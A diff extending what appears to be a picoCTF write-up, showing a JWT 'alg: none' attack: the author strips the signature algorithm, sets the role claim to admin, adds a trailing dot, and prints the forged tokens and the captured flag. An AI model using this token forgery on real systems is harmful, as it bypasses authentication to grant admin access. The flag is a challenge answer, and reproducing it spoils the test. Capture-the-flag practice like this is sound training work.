@@ -51,4 +51,36 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjc1ODU1ODMyNjczLCJhZ2VudCI6Ik1
 ![image](https://user-images.githubusercontent.com/70703371/217519131-fe059eb7-2413-46b1-8c6f-692b1a2bdb01.png)
 
 
-6. Hmm.. Let's try with 
+6. Hmm.. we can use another approach by remove the algorithm used, we can change it to **none**. But since jwt.io can change the alg to none, because it's not in the database, we can use [this](https://token.dev/) jwt debugger.
+
+> CHANGE IT TO NONE
+
+![image](https://user-images.githubusercontent.com/70703371/217521278-b0686d36-6fbe-4b7f-b433-0eb42342f610.png)
+
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjc1ODU1ODMyNjczLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOS4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjc1ODU1ODMzfQ
+```
+
+7. Now login again as `test`, then after paste the token, remember jwt always have 2 dots (.), while we have one, let's add another dot at the end.
+
+> FINAL TOKEN
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjc1ODU1ODMyNjczLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOS4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjc1ODU1ODMzfQ.
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/217522272-59229211-fcf8-4c54-8016-50330268c19f.png)
+
+
+8. Got the flag!
+
+## FLAG
+
+```
+picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}
+```
+
+
